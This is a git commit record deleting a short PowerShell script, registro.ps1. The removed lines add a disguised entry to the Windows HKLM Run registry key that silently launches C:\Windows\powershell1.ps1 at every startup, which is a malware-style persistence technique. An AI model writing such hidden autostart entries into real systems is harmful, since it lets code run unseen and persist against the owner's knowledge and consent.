5d0bf161282ad460087466f6d34741954d27abea
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 01:25:12 -0300

    Delete registro.ps1

--- registro.ps1
+++
@@ -1,6 +0,0 @@
-# Caminho do script PowerShell
-$programPath = "C:\Windows\powershell1.ps1"
-
-# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
-$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
